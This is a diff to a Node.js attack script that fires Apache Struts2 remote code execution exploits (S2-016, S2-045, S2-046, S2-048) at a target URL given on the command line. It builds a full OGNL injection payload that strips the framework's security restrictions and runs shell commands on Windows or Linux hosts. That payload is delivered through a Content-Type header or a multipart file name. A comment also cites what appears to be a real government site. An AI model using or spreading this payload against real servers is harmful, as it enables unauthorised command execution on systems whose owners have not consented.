@@ -6,9 +6,28 @@ var szMyName = 'M.T.X._2017-06-08',
 	g_oRst = {},
 	a = process.argv.splice(2),
 	bRunHost = false,
+	g_szCmd = "echo whoami:;whoami;echo pwd:;pwd;echo cmdend",
+	g_szCmdW = "echo whoami: && whoami && echo pwd: && pwd && echo cmdend",
 	aHS = "X-Content-Security-Policy,x-frame-options,X-Webkit-CSP,X-XSS-Protection,X-Download-Options".toLowerCase().split(/[,]/),
-	g_postData = null, g_szCmd = "echo whoami:;whoami;echo pwd:;pwd;echo cmdend",
-	g_szCmdW = "echo whoami: && whoami && echo pwd: && pwd && echo cmdend";
+	g_postData = "%{(#nike='multipart/form-data')"
+		+ ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" 
+		+ ".(#_memberAccess?(#_memberAccess=#dm):" 
+		+ "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])" 
+		+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
+		+ ".(#ognlUtil.getExcludedPackageNames().clear())"
+		+ ".(#ognlUtil.getExcludedClasses().clear())"
+		+ ".(#context.setMemberAccess(#dm))))"
+		+ ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
+		+ ".(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'}))"
+		+ ".(#p=new java.lang.ProcessBuilder(#cmds))"
+		+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
+		+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse()"
+		+ ".getOutputStream()))"
+	    // 我添加的当前位置行加上后，会无法输出
+	    // + ".(#ros.write(@org.apache.struts2.ServletActionContext@getRequest().getServletContext().getRealPath('.').getBytes()))"
+		+ ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
+		+ ".(#ros.flush()).(#ros.close())}"
+		;
 
 if(0 < a.length)url = a[0];
 process.stdin.setEncoding('utf8');
@@ -163,6 +182,26 @@ function fnTest(s)
 	  );
 }
 
+function doStruts2_046(url)
+{
+	request({method: 'POST',uri: url,"formData":
+		{
+			custom_file:
+			{
+				"value":"xxx",
+				"options":
+				{
+					"filename":encodeURIComponent(g_postData),
+					"contentType": "image/jpeg"
+				}
+			}
+		}},
+    	function(e,r,b)
+    {
+    	fnDoBody(b,"s2-046");
+    });
+}
+
 
 function doStruts2_048(url,fnCbk)
 {
@@ -193,7 +232,7 @@ function doStruts2_048(url,fnCbk)
 }
 
 // http://gdsw.lss.gov.cn/swwssb/userRegisterAction.do?redirect:http://webscan.360.cn
-function fnCheckS2_016(url)
+function doStruts2_016(url)
 {
 	/*///////////
 	var szCode = ("%{(#nike='multipart/form-data')"
@@ -273,33 +312,13 @@ function doStruts2_045(url, fnCbk)
 	    ,headers:
 	    {
 	    	"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
-	    	"Content-Type":g_postData = 
-	    	    ("%{(#nike='multipart/form-data')"
-		+ ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" 
-		+ ".(#_memberAccess?(#_memberAccess=#dm):" 
-			+ "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])" 
-			+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
-			+ ".(#ognlUtil.getExcludedPackageNames().clear())"
-		+ ".(#ognlUtil.getExcludedClasses().clear())"
-		+ ".(#context.setMemberAccess(#dm))))"
-		+ ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
-		+ ".(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'}))"
-		+ ".(#p=new java.lang.ProcessBuilder(#cmds))"
-		+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
-		+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse()"
-		+ ".getOutputStream()))"
-	    // 我添加的当前位置行加上后，会无法输出
-	    // + ".(#ros.write(@org.apache.struts2.ServletActionContext@getRequest().getServletContext().getRealPath('.').getBytes()))"
-		+ ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
-		+ ".(#ros.flush()).(#ros.close())}")
-	    	    // 
+	    	"Content-Type":g_postData
 	    }}
 	  , function (error, response, body){
 	  		if(body)
 	  		{
 	  			fnDoBody(body,"s2-045");
 	  		}
-	  		// console.log(body);
 	    }
 	  );
 }
@@ -318,9 +337,11 @@ function fnTestAll()
 
 if(0 < a.length)
 {
+	doStruts2_016(url);
 	doStruts2_045(url);
+	doStruts2_046(url);
 	doStruts2_048(url);
-	fnCheckS2_016(url);
+	
 	fnTestAll();
 }
 // checkWeblogicT3("192.168.10.133",9001);
